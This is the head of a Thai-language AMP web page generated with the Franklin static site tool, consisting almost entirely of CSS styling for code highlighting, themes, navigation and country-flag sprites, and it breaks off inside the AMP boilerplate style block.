<!doctypehtml><html amp lang=th><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#site-nav .langs-dropdown-menu .lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}.lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){.lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){.lunrSearchForm{display:block;width:28rem}.lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}.lunrSearch .search-input{width:26rem}}@media (max-width: 480px){.lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}.lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:8rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){#site-nav{top:5rem}}@media (max-width: 480px){.masthead{height:30rem}#site-nav ul li{width:calc(100% - 2rem)}}@media (max-width: 680px){.masthead{height:26rem}#site-nav{z-index:1}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes 